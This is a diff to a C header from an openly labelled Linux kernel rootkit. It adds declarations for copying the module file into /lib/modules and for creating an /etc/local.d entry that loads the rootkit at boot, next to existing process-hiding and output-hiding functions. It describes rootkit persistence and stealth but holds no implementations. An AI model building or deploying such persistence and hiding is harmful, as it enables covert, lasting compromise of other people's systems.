@@ -190,4 +190,29 @@ static inline bool check_pid_hidden_auth(const pid_t i32_pid)
  */
 size_t hide_lines(char __user *const s_buffer, const size_t sz_len, const char *const s_search);
 
+/**
+ * Copies a file from the given source path to destination path, in kernel space.
+ *
+ * @param p_src_file The source file
+ * @param p_dst_file The destination file
+ * @return 0 on success, otherwise an error code
+ */
+int kernel_copy_file(file_t *const p_src_file, file_t *const p_dst_file);
+
+/**
+ * Copies the module file (/root/rootkit.ko) to /lib/modules/rootkit_mod.ko.
+ *
+ * @return 0 on success, otherwise an error code
+ */
+int copy_module_file(void);
+
+/**
+ * Creates a file in /etc/local.d/ to automatically load the rootkit on boot.
+ * @note This function is only available on OpenRC-based systems
+ *       and requires service `local` to be enabled.
+ *
+ * @return 0 on success, otherwise an error code
+ */
+int create_locald_file(void);
+
 #endif
